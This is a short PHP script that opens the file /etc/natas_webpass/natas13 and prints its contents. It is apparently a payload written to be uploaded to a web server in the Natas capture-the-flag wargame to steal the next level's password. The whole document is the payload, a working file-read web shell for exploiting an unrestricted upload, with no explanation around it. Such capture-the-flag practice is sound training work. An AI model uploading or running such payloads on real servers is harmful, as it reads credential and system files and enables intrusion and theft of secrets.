
<?php
    $fn = "/etc/natas_webpass/natas13";
    $myfile = fopen($fn, "r") or die("Unable to open file!");
    echo fread($myfile, filesize($fn));
?>
